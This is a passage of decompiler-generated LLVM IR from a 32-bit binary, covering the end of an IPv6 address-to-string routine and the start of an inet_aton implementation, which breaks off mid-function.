  %v4_805db7b = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805dbc7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805dbc7

dec_label_pc_805dbc7:                             ; preds = %dec_label_pc_805dbbd, %dec_label_pc_805dbf4
  %v0_805dbf469 = phi i32 [ 0, %dec_label_pc_805dbbd ], [ %v1_805dbf4, %dec_label_pc_805dbf4 ]
  %v0_805dbdf68 = phi i32 [ -1, %dec_label_pc_805dbbd ], [ %v0_805dbdf9, %dec_label_pc_805dbf4 ]
  %v0_805dbff67 = phi i32 [ -1, %dec_label_pc_805dbbd ], [ %v0_805dbe410, %dec_label_pc_805dbf4 ]
  %v0_805dc0a66 = phi i32 [ -1, %dec_label_pc_805dbbd ], [ %v0_805dbef14, %dec_label_pc_805dbf4 ]
  %v2_805dbc7 = mul nuw nsw i32 %v0_805dbf469, 4
  %v3_805dbc7 = add nuw nsw i32 %v2_805dbc7, 60
  %v4_805dbc7 = add i32 %v3_805dbc7, %v0_805dbc7.pre
  %v5_805dbc7 = inttoptr i32 %v4_805dbc7 to i32*
  %v6_805dbc7 = load i32, i32* %v5_805dbc7, align 4
  %v7_805dbc7 = icmp eq i32 %v6_805dbc7, 0
  %v1_805dbcc = icmp eq i1 %v7_805dbc7, false
  %v10_805dbdf = icmp eq i32 %v0_805dbdf68, -1
  br i1 %v1_805dbcc, label %dec_label_pc_805dbdf, label %dec_label_pc_805dbce

dec_label_pc_805dbce:                             ; preds = %dec_label_pc_805dbc7
  %v1_805dbd1 = icmp eq i1 %v10_805dbdf, false
  br i1 %v1_805dbd1, label %dec_label_pc_805dbdc, label %dec_label_pc_805dbd3

dec_label_pc_805dbd3:                             ; preds = %dec_label_pc_805dbce
  store i32 %v0_805dbf469, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805dbf4

dec_label_pc_805dbdc:                             ; preds = %dec_label_pc_805dbce
  %v0_805dbdc = load i32, i32* %ebx.global-to-local, align 4
  %v1_805dbdc = add i32 %v0_805dbdc, 1
  store i32 %v1_805dbdc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805dbf4

dec_label_pc_805dbdf:                             ; preds = %dec_label_pc_805dbc7
  br i1 %v10_805dbdf, label %dec_label_pc_805dbf4, label %dec_label_pc_805dbe4

dec_label_pc_805dbe4:                             ; preds = %dec_label_pc_805dbdf
  %v10_805dbe4 = icmp eq i32 %v0_805dbff67, -1
  %v0_805dbed.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805dbe9 = load i32, i32* @ebp, align 4
  %v7_805dbeb = icmp sgt i32 %v0_805dbed.pre, %v1_805dbe9
  %or.cond = or i1 %v10_805dbe4, %v7_805dbeb
  br i1 %or.cond, label %dec_label_pc_805dbed, label %dec_label_pc_805dbf1

dec_label_pc_805dbed:                             ; preds = %dec_label_pc_805dbe4
  store i32 %v0_805dbed.pre, i32* @ebp, align 4
  store i32 %v0_805dc0a66, i32* @edi, align 4
  br label %dec_label_pc_805dbf1

dec_label_pc_805dbf1:                             ; preds = %dec_label_pc_805dbe4, %dec_label_pc_805dbed
  %v0_805dbe412 = phi i32 [ %v0_805dc0a66, %dec_label_pc_805dbed ], [ %v0_805dbff67, %dec_label_pc_805dbe4 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbf4

dec_label_pc_805dbf4:                             ; preds = %dec_label_pc_805dbdf, %dec_label_pc_805dbdc, %dec_label_pc_805dbd3, %dec_label_pc_805dbf1
  %v0_805dbef14 = phi i32 [ %v0_805dc0a66, %dec_label_pc_805dbdf ], [ %v0_805dc0a66, %dec_label_pc_805dbdc ], [ %v0_805dbf469, %dec_label_pc_805dbd3 ], [ -1, %dec_label_pc_805dbf1 ]
  %v0_805dbdf9 = phi i32 [ -1, %dec_label_pc_805dbdf ], [ %v0_805dbdf68, %dec_label_pc_805dbdc ], [ %v0_805dbf469, %dec_label_pc_805dbd3 ], [ -1, %dec_label_pc_805dbf1 ]
  %v0_805dbe410 = phi i32 [ %v0_805dbff67, %dec_label_pc_805dbdf ], [ %v0_805dbff67, %dec_label_pc_805dbdc ], [ %v0_805dbff67, %dec_label_pc_805dbd3 ], [ %v0_805dbe412, %dec_label_pc_805dbf1 ]
  %v1_805dbf4 = add nuw nsw i32 %v0_805dbf469, 1
  store i32 %v1_805dbf4, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_805dbf4, 8
  br i1 %exitcond, label %dec_label_pc_805dbfa, label %dec_label_pc_805dbc7

dec_label_pc_805dbfa:                             ; preds = %dec_label_pc_805dbf4
  %v10_805dbfa = icmp eq i32 %v0_805dbef14, -1
  br i1 %v10_805dbfa, label %dec_label_pc_805dc0c, label %dec_label_pc_805dbff

dec_label_pc_805dbff:                             ; preds = %dec_label_pc_805dbfa
  %v10_805dbff = icmp eq i32 %v0_805dbe410, -1
  %v0_805dc08.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_805dbff, label %dec_label_pc_805dc08, label %dec_label_pc_805dc04

dec_label_pc_805dc04:                             ; preds = %dec_label_pc_805dbff
  %v1_805dc04 = load i32, i32* @ebp, align 4
  %v7_805dc06 = icmp sgt i32 %v0_805dc08.pre, %v1_805dc04
  br i1 %v7_805dc06, label %dec_label_pc_805dc08, label %dec_label_pc_805dc0c

dec_label_pc_805dc08:                             ; preds = %dec_label_pc_805dbff, %dec_label_pc_805dc04
  store i32 %v0_805dc08.pre, i32* @ebp, align 4
  store i32 %v0_805dbef14, i32* @edi, align 4
  br label %dec_label_pc_805dc0c

dec_label_pc_805dc0c:                             ; preds = %dec_label_pc_805dc04, %dec_label_pc_805dbfa, %dec_label_pc_805dc08
  %v0_805dc0c = phi i32 [ %v0_805dbe410, %dec_label_pc_805dc04 ], [ %v0_805dbe410, %dec_label_pc_805dbfa ], [ %v0_805dbef14, %dec_label_pc_805dc08 ]
  %v10_805dc0c = icmp eq i32 %v0_805dc0c, -1
  br i1 %v10_805dc0c, label %dec_label_pc_805dc19, label %dec_label_pc_805dc11

dec_label_pc_805dc11:                             ; preds = %dec_label_pc_805dc0c
  %v0_805dc11 = load i32, i32* @ebp, align 4
  %v1_805dc11 = add i32 %v0_805dc11, -1
  %v6_805dc11 = sub i32 0, %v0_805dc11
  %v7_805dc11 = and i32 %v0_805dc11, %v6_805dc11
  %v8_805dc11 = icmp slt i32 %v7_805dc11, 0
  %v9_805dc11 = icmp eq i32 %v1_805dc11, 0
  %v10_805dc11 = icmp slt i32 %v1_805dc11, 0
  %v3_805dc14 = icmp eq i1 %v10_805dc11, %v8_805dc11
  %v4_805dc14 = icmp eq i1 %v9_805dc11, false
  %v5_805dc14 = and i1 %v4_805dc14, %v3_805dc14
  br i1 %v5_805dc14, label %dec_label_pc_805dc19, label %dec_label_pc_805dc16

dec_label_pc_805dc16:                             ; preds = %dec_label_pc_805dc11
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805dc19

dec_label_pc_805dc19:                             ; preds = %dec_label_pc_805dc11, %dec_label_pc_805dc0c, %dec_label_pc_805dc16
  %v0_805dcb919 = phi i32 [ %v0_805dc0c, %dec_label_pc_805dc11 ], [ %v0_805dc0c, %dec_label_pc_805dc0c ], [ -1, %dec_label_pc_805dc16 ]
  %v2_805dc19 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_805dc19, i32* @ebx, align 4
  %v3_805dc9b = add i32 %v4_805db7b, 64
  %v12_805dc59 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805dcb959 = icmp eq i32 %v0_805dcb919, -1
  %v1_805dc61 = icmp eq i1 %v12_805dc59, false
  br label %dec_label_pc_805dc24

dec_label_pc_805dc24:                             ; preds = %dec_label_pc_805dc19, %dec_label_pc_805dcaf
  %v10_805dcb965 = phi i1 [ %v10_805dcb959, %dec_label_pc_805dc19 ], [ %v10_805dcb9, %dec_label_pc_805dcaf ]
  %v0_805dc3e64 = phi i32 [ 0, %dec_label_pc_805dc19 ], [ %v1_805dcaf, %dec_label_pc_805dcaf ]
  %v1_805dc3463 = phi i32 [ %v0_805dcb919, %dec_label_pc_805dc19 ], [ %v0_805dcb9.pre, %dec_label_pc_805dcaf ]
  %v0_805dc4262 = phi i32 [ %v2_805dc19, %dec_label_pc_805dc19 ], [ %v0_805dc3820, %dec_label_pc_805dcaf ]
  %stack_var_-120.161 = phi i8* [ null, %dec_label_pc_805dc19 ], [ %stack_var_-120.0, %dec_label_pc_805dcaf ]
  %stack_var_-116.160 = phi i32 [ 32, %dec_label_pc_805dc19 ], [ %stack_var_-116.0, %dec_label_pc_805dcaf ]
  br i1 %v10_805dcb965, label %dec_label_pc_805dc3e, label %dec_label_pc_805dc29

dec_label_pc_805dc29:                             ; preds = %dec_label_pc_805dc24
  %v12_805dc29 = icmp eq i32 %v0_805dc3e64, %v1_805dc3463
  %v5_805dc2b = icmp slt i32 %v0_805dc3e64, %v1_805dc3463
  br i1 %v5_805dc2b, label %dec_label_pc_805dc3e, label %dec_label_pc_805dc2d

dec_label_pc_805dc2d:                             ; preds = %dec_label_pc_805dc29
  %v1_805dc2d = load i32, i32* @ebp, align 4
  %v2_805dc2d = add i32 %v1_805dc2d, %v1_805dc3463
  store i32 %v2_805dc2d, i32* %eax.global-to-local, align 4
  %v5_805dc32 = icmp slt i32 %v0_805dc3e64, %v2_805dc2d
  br i1 %v5_805dc32, label %dec_label_pc_805dc34, label %dec_label_pc_805dc3e

dec_label_pc_805dc34:                             ; preds = %dec_label_pc_805dc2d
  %v1_805dc36 = icmp eq i1 %v12_805dc29, false
  br i1 %v1_805dc36, label %dec_label_pc_805dcaf, label %dec_label_pc_805dc38

dec_label_pc_805dc38:                             ; preds = %dec_label_pc_805dc34
  %v1_805dc38 = inttoptr i32 %v0_805dc4262 to i8*
  store i8 58, i8* %v1_805dc38, align 1
  %v0_805dc3b = load i32, i32* @ebx, align 4
  %v1_805dc3b = add i32 %v0_805dc3b, 1
  store i32 %v1_805dc3b, i32* @ebx, align 4
  br label %dec_label_pc_805dcaf

dec_label_pc_805dc3e:                             ; preds = %dec_label_pc_805dc2d, %dec_label_pc_805dc29, %dec_label_pc_805dc24
  %v1_805dc3e = icmp eq i32 %v0_805dc3e64, 0
  br i1 %v1_805dc3e, label %dec_label_pc_805dc46, label %dec_label_pc_805dc42

dec_label_pc_805dc42:                             ; preds = %dec_label_pc_805dc3e
  %v1_805dc42 = inttoptr i32 %v0_805dc4262 to i8*
  store i8 58, i8* %v1_805dc42, align 1
  %v0_805dc45 = load i32, i32* @ebx, align 4
  %v1_805dc45 = add i32 %v0_805dc45, 1
  store i32 %v1_805dc45, i32* @ebx, align 4
  %v0_805dc46.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805dc46

dec_label_pc_805dc46:                             ; preds = %dec_label_pc_805dc3e, %dec_label_pc_805dc42
  %v0_805dca4 = phi i32 [ %v0_805dc4262, %dec_label_pc_805dc3e ], [ %v1_805dc45, %dec_label_pc_805dc42 ]
  %v1_805dc9b = phi i32 [ 0, %dec_label_pc_805dc3e ], [ %v0_805dc46.pre, %dec_label_pc_805dc42 ]
  %v9_805dc46 = icmp eq i32 %v1_805dc9b, 6
  %v1_805dc49 = icmp eq i1 %v9_805dc46, false
  br i1 %v1_805dc49, label %dec_label_pc_805dc9a, label %dec_label_pc_805dc4b

dec_label_pc_805dc4b:                             ; preds = %dec_label_pc_805dc46
  %v0_805dc4b = load i32, i32* @edi, align 4
  %v1_805dc4b = icmp eq i32 %v0_805dc4b, 0
  %v1_805dc4d = icmp eq i1 %v1_805dc4b, false
  br i1 %v1_805dc4d, label %dec_label_pc_805dc9a, label %dec_label_pc_805dc4f

dec_label_pc_805dc4f:                             ; preds = %dec_label_pc_805dc4b
  %v0_805dc4f = load i32, i32* @ebp, align 4
  %v9_805dc4f = icmp eq i32 %v0_805dc4f, 6
  br i1 %v9_805dc4f, label %dec_label_pc_805dc63, label %dec_label_pc_805dc54

dec_label_pc_805dc54:                             ; preds = %dec_label_pc_805dc4f
  %v9_805dc54 = icmp eq i32 %v0_805dc4f, 5
  %v1_805dc57 = icmp eq i1 %v9_805dc54, false
  br i1 %v1_805dc57, label %dec_label_pc_805dc9a, label %dec_label_pc_805dc59

dec_label_pc_805dc59:                             ; preds = %dec_label_pc_805dc54
  br i1 %v1_805dc61, label %dec_label_pc_805dc9a, label %dec_label_pc_805dc63

dec_label_pc_805dc63:                             ; preds = %dec_label_pc_805dc59, %dec_label_pc_805dc4f
  %v2_805dc69 = sub i32 %v0_805dca4, %v2_805dc19
  store i32 %v2_805dc69, i32* @esi, align 4
  %v2_805dc74 = sub i32 46, %v2_805dc69
  store i32 %v2_805dc74, i32* @ecx, align 4
  %v1_805dc76 = add i32 %arg2, 12
  store i32 %v1_805dc76, i32* @eax, align 4
  store i32 %v0_805dca4, i32* @edx, align 4
  %v0_805dc7b = load i8*, i8** %stack_var_-124, align 4
  %v1_805dc7b = ptrtoint i8* %v0_805dc7b to i32
  %v3_805dc7b = ptrtoint i8* %stack_var_-120.161 to i32
  %v5_805dc7b = call i32 @inet_ntop4(i32 %v1_805dc7b, i32 %v3_805dc7b, i32 %stack_var_-116.160)
  store i32 %v5_805dc7b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805dc82 = icmp eq i32 %v5_805dc7b, 0
  br i1 %v1_805dc82, label %dec_label_pc_805dd0c, label %dec_label_pc_805dc8a

dec_label_pc_805dc8a:                             ; preds = %dec_label_pc_805dc63
  %v0_805dc8d = load i32, i32* @ebx, align 4
  %v5_805dc8d = inttoptr i32 %v0_805dc8d to i8*
  store i8* %v5_805dc8d, i8** %stack_var_-124, align 4
  %v3_805dc8e = call i32 @strlen(i8* %v5_805dc8d)
  store i32 %v3_805dc8e, i32* %eax.global-to-local, align 4
  %v0_805dc96 = load i32, i32* @ebx, align 4
  %v3_805dc96 = add i32 %v0_805dc96, %v3_805dc8e
  store i32 %v3_805dc96, i32* @ebx, align 4
  %v0_805dcbe.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805dcbe

dec_label_pc_805dc9a:                             ; preds = %dec_label_pc_805dc59, %dec_label_pc_805dc54, %dec_label_pc_805dc4b, %dec_label_pc_805dc46
  %v0_805dc9a = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805dc9a, i32* %stack_var_-112, align 4
  %v2_805dc9b = mul i32 %v1_805dc9b, 4
  %v4_805dc9b = add i32 %v3_805dc9b, %v2_805dc9b
  %v5_805dc9b = inttoptr i32 %v4_805dc9b to i32*
  %v6_805dc9b = load i32, i32* %v5_805dc9b, align 4
  %v5_805dca4 = inttoptr i32 %v0_805dca4 to i8*
  store i8* %v5_805dca4, i8** %stack_var_-124, align 4
  %v4_805dca5 = call i32 @sprintf(i32 %v0_805dca4, i32 ptrtoint ([3 x i8]* @global_var_806da94.757 to i32))
  store i32 %v4_805dca5, i32* %eax.global-to-local, align 4
  %v0_805dcad = load i32, i32* @ebx, align 4
  %v2_805dcad = add i32 %v0_805dcad, %v4_805dca5
  store i32 %v2_805dcad, i32* @ebx, align 4
  br label %dec_label_pc_805dcaf

dec_label_pc_805dcaf:                             ; preds = %dec_label_pc_805dc34, %dec_label_pc_805dc38, %dec_label_pc_805dc9a
  %stack_var_-116.0 = phi i32 [ %v6_805dc9b, %dec_label_pc_805dc9a ], [ %stack_var_-116.160, %dec_label_pc_805dc34 ], [ %stack_var_-116.160, %dec_label_pc_805dc38 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806da94.757, i32 0, i32 0), %dec_label_pc_805dc9a ], [ %stack_var_-120.161, %dec_label_pc_805dc34 ], [ %stack_var_-120.161, %dec_label_pc_805dc38 ]
  %v0_805dc3820 = phi i32 [ %v2_805dcad, %dec_label_pc_805dc9a ], [ %v0_805dc4262, %dec_label_pc_805dc34 ], [ %v1_805dc3b, %dec_label_pc_805dc38 ]
  %v0_805dcaf = load i32, i32* @esi, align 4
  %v1_805dcaf = add i32 %v0_805dcaf, 1
  %v0_805dcb9.pre = load i32, i32* @edi, align 4
  store i32 %v1_805dcaf, i32* @esi, align 4
  %v7_805dcb3 = icmp sgt i32 %v1_805dcaf, 7
  %v10_805dcb9 = icmp eq i32 %v0_805dcb9.pre, -1
  br i1 %v7_805dcb3, label %dec_label_pc_805dcb9, label %dec_label_pc_805dc24

dec_label_pc_805dcb9:                             ; preds = %dec_label_pc_805dcaf
  br i1 %v10_805dcb9, label %dec_label_pc_805dcca, label %dec_label_pc_805dcbe

dec_label_pc_805dcbe:                             ; preds = %dec_label_pc_805dcb9, %dec_label_pc_805dc8a
  %v0_805dcc6 = phi i32 [ %v0_805dc3820, %dec_label_pc_805dcb9 ], [ %v3_805dc96, %dec_label_pc_805dc8a ]
  %v0_805dcbe = phi i32 [ %v0_805dcb9.pre, %dec_label_pc_805dcb9 ], [ %v0_805dcbe.pre, %dec_label_pc_805dc8a ]
  %v1_805dcbe = load i32, i32* @ebp, align 4
  %v2_805dcbe = add i32 %v1_805dcbe, %v0_805dcbe
  store i32 %v2_805dcbe, i32* %eax.global-to-local, align 4
  %v9_805dcc1 = icmp eq i32 %v2_805dcbe, 8
  %v1_805dcc4 = icmp eq i1 %v9_805dcc1, false
  br i1 %v1_805dcc4, label %dec_label_pc_805dcca, label %dec_label_pc_805dcc6

dec_label_pc_805dcc6:                             ; preds = %dec_label_pc_805dcbe
  %v1_805dcc6 = inttoptr i32 %v0_805dcc6 to i8*
  store i8 58, i8* %v1_805dcc6, align 1
  %v0_805dcc9 = load i32, i32* @ebx, align 4
  %v1_805dcc9 = add i32 %v0_805dcc9, 1
  store i32 %v1_805dcc9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805dcca

dec_label_pc_805dcca:                             ; preds = %dec_label_pc_805dcbe, %dec_label_pc_805dcb9, %dec_label_pc_805dcc6
  %v0_805dcce = phi i32 [ %v0_805dcc6, %dec_label_pc_805dcbe ], [ %v0_805dc3820, %dec_label_pc_805dcb9 ], [ %v1_805dcc9, %dec_label_pc_805dcc6 ]
  store i32 %v2_805dc19, i32* %edx.global-to-local, align 4
  %v1_805dcce = add i32 %v0_805dcce, 1
  store i32 %v1_805dcce, i32* %eax.global-to-local, align 4
  %v1_805dcd1 = inttoptr i32 %v0_805dcce to i8*
  store i8 0, i8* %v1_805dcd1, align 1
  %v0_805dcd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805dcd4 = load i32, i32* %edx.global-to-local, align 4
  %v2_805dcd4 = sub i32 %v0_805dcd4, %v1_805dcd4
  store i32 %v2_805dcd4, i32* @eax, align 4
  %tmp75 = icmp ugt i32 %v2_805dcd4, %arg4
  br i1 %tmp75, label %dec_label_pc_805dcdc, label %dec_label_pc_805dce9

dec_label_pc_805dcdc:                             ; preds = %dec_label_pc_805dcca
  %v0_805dcdc = load i8*, i8** %stack_var_-124, align 4
  %v1_805dcdc = ptrtoint i8* %v0_805dcdc to i32
  %v2_805dcdc = call i32 @__errno_location(i32 %v1_805dcdc)
  store i32 %v2_805dcdc, i32* %eax.global-to-local, align 4
  %v1_805dce1 = inttoptr i32 %v2_805dcdc to i32*
  store i32 28, i32* %v1_805dce1, align 4
  br label %dec_label_pc_805dd0a

dec_label_pc_805dce9:                             ; preds = %dec_label_pc_805dcca
  %v0_805dce9 = load i32, i32* @edi, align 4
  store i32 %v0_805dce9, i32* %stack_var_-112, align 4
  %tmp46 = bitcast i8** %stack_var_12 to i32*
  %v3_805dcec3 = load i32, i32* %tmp46, align 4
  %tmp47 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_805dcec3, i32* %tmp47, align 4
  %v0_805dcf3.cast = inttoptr i32 %v3_805dcec3 to i8*
  %v5_805dcf3 = call i32 @strcpy(i8* %v0_805dcf3.cast, i32 %v2_805dc19)
  store i32 %v5_805dcf3, i32* %eax.global-to-local, align 4
  store i32 %v5_805dcf3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805dd0c

dec_label_pc_805dcff:                             ; preds = %dec_label_pc_805db58
  %v1_805dcff = call i32 @__errno_location(i32 %v0_805db4b)
  store i32 %v1_805dcff, i32* %eax.global-to-local, align 4
  %v1_805dd04 = inttoptr i32 %v1_805dcff to i32*
  store i32 97, i32* %v1_805dd04, align 4
  br label %dec_label_pc_805dd0a

dec_label_pc_805dd0a:                             ; preds = %dec_label_pc_805dcdc, %dec_label_pc_805dcff
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805dd0c

dec_label_pc_805dd0c:                             ; preds = %dec_label_pc_805dc63, %dec_label_pc_805dce9, %dec_label_pc_805db63, %dec_label_pc_805dd0a
  %v0_805dd0f = phi i32 [ 0, %dec_label_pc_805dc63 ], [ %v5_805dcf3, %dec_label_pc_805dce9 ], [ %v3_805db6f, %dec_label_pc_805db63 ], [ 0, %dec_label_pc_805dd0a ]
  store i32 %v0_805dd0f, i32* %eax.global-to-local, align 4
  store i32 %v0_805db4b, i32* @ebx, align 4
  store i32 %v0_805db4a, i32* @esi, align 4
  store i32 %v0_805db49, i32* @edi, align 4
  store i32 %v0_805db48, i32* @ebp, align 4
  ret i32 %v0_805dd0f

; uselistorder directives
  uselistorder i32 %v0_805dd0f, { 1, 0 }
  uselistorder i32 %v0_805dcce, { 1, 0 }
  uselistorder i1 %v10_805dcb9, { 1, 0 }
  uselistorder i32 %v0_805dcb9.pre, { 1, 0, 2 }
  uselistorder i32 %v1_805dcaf, { 1, 0, 2 }
  uselistorder i32 %v1_805dc9b, { 1, 0 }
  uselistorder i32 %v0_805dca4, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-116.160, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.161, { 2, 1, 0 }
  uselistorder i32 %v0_805dc4262, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805dc3463, { 2, 1, 0 }
  uselistorder i32 %v0_805dc3e64, { 3, 2, 1, 0 }
  uselistorder i32 %v2_805dc19, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805dcb919, { 1, 0 }
  uselistorder i32 %v1_805dc11, { 1, 0 }
  uselistorder i32 %v0_805dc11, { 1, 0, 2 }
  uselistorder i32 %v0_805dc0c, { 1, 2, 0 }
  uselistorder i32 %v1_805dbf4, { 0, 2, 1 }
  uselistorder i32 %v0_805dbe410, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805dbef14, { 1, 2, 0, 3 }
  uselistorder i1 %v10_805dbdf, { 1, 0 }
  uselistorder i32 %v0_805dc0a66, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805dbff67, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805dbf469, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805dbaf70, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_805db4b, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 4, 1, 3, 2, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder [3 x i8]* @global_var_806da94.757, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805dd0c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805dd0a, { 1, 0 }
  uselistorder label %dec_label_pc_805dcca, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805dcaf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805dc46, { 1, 0 }
  uselistorder label %dec_label_pc_805dc24, { 1, 0 }
  uselistorder label %dec_label_pc_805dc19, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805dc0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805dc08, { 1, 0 }
  uselistorder label %dec_label_pc_805dbf4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805dbf1, { 1, 0 }
  uselistorder label %dec_label_pc_805dbc7, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805dd1f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805dd1f, i32* @ecx, align 4
  %v1_805dd23 = icmp eq i8* %arg1, null
  br i1 %v1_805dd23, label %dec_label_pc_805dda4, label %dec_label_pc_805dd27

dec_label_pc_805dd27:                             ; preds = %entry
  %v0_805dd35.pre = load i32, i32* @global_var_8073fcc, align 4
  br label %dec_label_pc_805dd32

dec_label_pc_805dd32:                             ; preds = %dec_label_pc_805dd27, %dec_label_pc_805dd7b
  %v2_805dd7e35 = phi i32 [ 1, %dec_label_pc_805dd27 ], [ %v3_805dd7e, %dec_label_pc_805dd7b ]
  %v0_805dd3234 = phi i32 [ %v4_805dd1f, %dec_label_pc_805dd27 ], [ %v0_805dd323, %dec_label_pc_805dd7b ]
  %v0_805dd9933 = phi i32 [ 0, %dec_label_pc_805dd27 ], [ %v2_805dd81, %dec_label_pc_805dd7b ]
  %v1_805dd32 = inttoptr i32 %v0_805dd3234 to i8*
  %v2_805dd32 = load i8, i8* %v1_805dd32, align 1
  %v3_805dd32 = sext i8 %v2_805dd32 to i32
  %v2_805dd3b = mul nsw i32 %v3_805dd32, 2
  %v3_805dd3b = add i32 %v2_805dd3b, %v0_805dd35.pre
  %v4_805dd3b = inttoptr i32 %v3_805dd3b to i8*
  %v5_805dd3b = load i8, i8* %v4_805dd3b, align 1
  %v6_805dd3b = and i8 %v5_805dd3b, 8
  %v7_805dd3b = icmp eq i8 %v6_805dd3b, 0
  br i1 %v7_805dd3b, label %dec_label_pc_805dda4, label %dec_label_pc_805dd42

dec_label_pc_805dd42:                             ; preds = %dec_label_pc_805dd32
  %v4_805dd56.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805dd56

dec_label_pc_805dd46:                             ; preds = %dec_label_pc_805dd56
  %v3_805dd46 = mul i32 %v1_805dd46, 10
  %v2_805dd49 = add i32 %v3_805dd46, -48
  %v3_805dd49 = add i32 %v2_805dd49, %v2_805dd58
  %v1_805dd4d = add i32 %v3_805dd49, -255
  %v6_805dd4d = sub i32 254, %v3_805dd49
  %v7_805dd4d = and i32 %v6_805dd4d, %v3_805dd49
  %v8_805dd4d = icmp slt i32 %v7_805dd4d, 0
  %v9_805dd4d = icmp eq i32 %v1_805dd4d, 0
  %v10_805dd4d = icmp slt i32 %v1_805dd4d, 0
  %v3_805dd53 = icmp eq i1 %v10_805dd4d, %v8_805dd4d
  %v4_805dd53 = icmp eq i1 %v9_805dd4d, false
  %v5_805dd53 = and i1 %v4_805dd53, %v3_805dd53
  br i1 %v5_805dd53, label %dec_label_pc_805dda4, label %dec_label_pc_805dd55

dec_label_pc_805dd55:                             ; preds = %dec_label_pc_805dd46
  %v1_805dd55 = add i32 %v0_805dd55, 1
  store i32 %v1_805dd55, i32* @ecx, align 4
  br label %dec_label_pc_805dd56

dec_label_pc_805dd56:                             ; preds = %dec_label_pc_805dd42, %dec_label_pc_805dd55
  %v1_805dd46 = phi i32 [ 0, %dec_label_pc_805dd42 ], [ %v3_805dd49, %dec_label_pc_805dd55 ]
  %v4_805dd56 = phi i32 [ %v4_805dd56.pre, %dec_label_pc_805dd42 ], [ %v6_805dd56, %dec_label_pc_805dd55 ]
  %v0_805dd55 = phi i32 [ %v0_805dd3234, %dec_label_pc_805dd42 ], [ %v1_805dd55, %dec_label_pc_805dd55 ]
  %v1_805dd56 = inttoptr i32 %v0_805dd55 to i8*
  %v2_805dd56 = load i8, i8* %v1_805dd56, align 1
  %v3_805dd56 = zext i8 %v2_805dd56 to i32
  %v5_805dd56 = and i32 %v4_805dd56, -256
  %v6_805dd56 = or i32 %v3_805dd56, %v5_805dd56
  store i32 %v6_805dd56, i32* @edx, align 4
  %v2_805dd58 = sext i8 %v2_805dd56 to i32
  %v2_805dd5b = mul nsw i32 %v2_805dd58, 2
  %v3_805dd5b = add i32 %v2_805dd5b, %v0_805dd35.pre
  %v4_805dd5b = inttoptr i32 %v3_805dd5b to i16*
  %v5_805dd5b = load i16, i16* %v4_805dd5b, align 2
  %v2_805dd60 = and i16 %v5_805dd5b, 8
  %v3_805dd60 = icmp eq i16 %v2_805dd60, 0
  %v1_805dd62 = icmp eq i1 %v3_805dd60, false
  br i1 %v1_805dd62, label %dec_label_pc_805dd46, label %dec_label_pc_805dd64

dec_label_pc_805dd64:                             ; preds = %dec_label_pc_805dd56
  %v8_805dd64 = sub nsw i32 2, %v2_805dd7e35
  %v9_805dd64 = and i32 %v8_805dd64, %v2_805dd7e35
  %v10_805dd64 = icmp slt i32 %v9_805dd64, 0
  %v11_805dd64 = icmp eq i32 %v2_805dd7e35, 3
  %v12_805dd64 = icmp slt i32 %v2_805dd7e35, 3
  %v3_805dd68 = icmp eq i1 %v12_805dd64, %v10_805dd64
  %v4_805dd68 = icmp eq i1 %v11_805dd64, false
  %v5_805dd68 = and i1 %v4_805dd68, %v3_805dd68
  br i1 %v5_805dd68, label %dec_label_pc_805dd72, label %dec_label_pc_805dd6a

dec_label_pc_805dd6a:                             ; preds = %dec_label_pc_805dd64
  %v10_805dd6a = icmp eq i8 %v2_805dd56, 46
